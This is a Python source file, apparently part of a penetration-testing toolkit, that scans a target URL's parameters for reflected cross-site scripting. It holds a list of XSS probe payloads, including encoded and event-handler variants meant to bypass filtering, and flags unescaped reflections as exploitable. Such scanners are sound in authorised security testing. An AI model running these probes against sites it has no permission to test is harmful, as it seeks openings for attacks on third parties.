"""
XSS Scanner - Simple reflected XSS detection
"""
import asyncio
import aiohttp
import json
import click
import time
from urllib.parse import urlencode, parse_qs, urlparse
from typing import List, Dict

from hackit.config import get_proxy, verify_ssl_default
from hackit.logger import get_logger

logger = get_logger(__name__)


class XSSScanner:
    """Detect reflected XSS vulnerabilities"""
    
    # Various XSS payloads with different encoding
    PAYLOADS = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
        ],
        "encoded": [
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        ],
        "event_handlers": [
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ],
        "double_encoded": [
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "&#37;3Cscript&#37;3E",
        ]
    }
    
    def __init__(self, timeout: int = 10, retries: int = 1, delay: float = 0.0):
        self.timeout = timeout
        self.retries = retries
        self.delay = delay
    
    async def test_parameter(self, session: aiohttp.ClientSession, url: str,
                            param: str, payloads: List[str]) -> List[dict]:
        """Test parameter for XSS"""
        results = []
        
        for payload in payloads:
            try:
                # Test GET parameter
                params = {param: payload}
                test_url = f"{url}?{urlencode(params)}"
                proxy = get_proxy()
                verify = verify_ssl_default()
                ssl_param = None if verify else False

                async with session.get(test_url, timeout=self.timeout, proxy=proxy, ssl=ssl_param) as response:
                    content = await response.text()

                    # Check for reflection
                    is_reflected = payload in content

                    # Check for escaping or encoding
                    is_escaped = (
                        "&lt;" in content or "&#" in content or
                        "%3C" in content or "\\" in content
                    )

                    # Heuristic: if payload is reflected verbatim and not escaped, mark exploitable
                    exploitable = is_reflected and not is_escaped

                    if is_reflected:
                        results.append({
                            "parameter": param,
                            "payload": payload,
                            "reflected": True,
                            "escaped": is_escaped,
                            "exploitable": exploitable,
                            "status": response.status
                        })
            except Exception as e:
                logger.debug('xss test error for %s param %s payload %s: %s', url, param, payload, e)
                continue
        
        return results
    
    async def scan(self, url: str, params: List[str], encoding_test: bool = True) -> List[dict]:
        """Scan URL for XSS"""
        connector = aiohttp.TCPConnector(limit_per_host=10)
        timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout_obj, trust_env=True) as session:
            all_results = []
            
            for param in params:
                # Test basic payloads
                basic_results = await self.test_parameter(session, url, param, self.PAYLOADS["basic"])
                all_results.extend(basic_results)
                
                if encoding_test:
                    # Test encoded payloads
                    encoded_results = await self.test_parameter(session, url, param, self.PAYLOADS["encoded"])
                    all_results.extend(encoded_results)
                    
                    # Test event handlers
                    event_results = await self.test_parameter(session, url, param, self.PAYLOADS["event_handlers"])
                    all_results.extend(event_results)
                
                # double encoded / other tests
                double_results = await self.test_parameter(session, url, param, self.PAYLOADS.get("double_encoded", []))
                all_results.extend(double_results)
            
            return all_results


@click.command()
@click.option('--url', required=True, help='Target URL with base path (e.g., http://example.com/search.php)')
@click.option('--params', required=True, help='Parameters to test (comma-separated)')
@click.option('--encoding-test', is_flag=True, help='Test encoding bypasses')
@click.option('--timeout', default=10, type=int, help='Request timeout')
@click.option('--retries', default=1, type=int, help='Number of retries for requests')
@click.option('--payload-file', default=None, help='Custom payload file (one payload per line)')
@click.option('--output', default=None, help='Save results to JSON')
def scan_xss(url, params, encoding_test, timeout, retries, payload_file, output):
    """Scan for reflected XSS vulnerabilities"""
    
    param_list = [p.strip() for p in params.split(',')]
    
    scanner = XSSScanner(timeout=timeout, retries=retries)

    if payload_file:
        try:
            with open(payload_file, 'r') as f:
                custom = [line.strip() for line in f.readlines() if line.strip()]
                scanner.PAYLOADS['basic'] = custom
        except Exception as e:
            click.echo(f"[!] Failed to load payload file: {e}")
    
    click.echo(f"[*] Scanning for XSS: {url}")
    click.echo(f"[*] Parameters: {param_list}")
    click.echo(f"[*] Encoding test: {encoding_test}")
    
    results = asyncio.run(scanner.scan(url, param_list, encoding_test))
    
    # Filter for exploitable
    exploitable = [r for r in results if r.get('exploitable')]
    reflected = [r for r in results if r.get('reflected')]
    
    click.echo(f"\n[+] Results:")
    click.echo(f"    Total payloads tested: {len(results)}")
    click.echo(f"    Reflected: {len(reflected)}")
    click.echo(f"    Exploitable (not escaped): {len(exploitable)}")
    
    if exploitable:
        click.echo(f"\n[!] EXPLOITABLE XSS FOUND:")
        for result in exploitable:
            click.echo(f"    Parameter: {result['parameter']}")
            click.echo(f"    Payload: {result['payload']}")
            click.echo()
    elif reflected:
        click.echo(f"\n[*] Reflected but escaped:")
        for result in reflected[:5]:
            click.echo(f"    {result['parameter']}: {result['payload'][:50]}")
    else:
        click.echo(f"\n[+] No XSS found")
    
    if output:
        with open(output, 'w') as f:
            json.dump({
                "url": url,
                "exploitable": len(exploitable),
                "reflected": len(reflected),
                "results": results
            }, f, indent=2)
        click.echo(f"\n[+] Results saved to {output}")


if __name__ == "__main__":
    scan_xss()
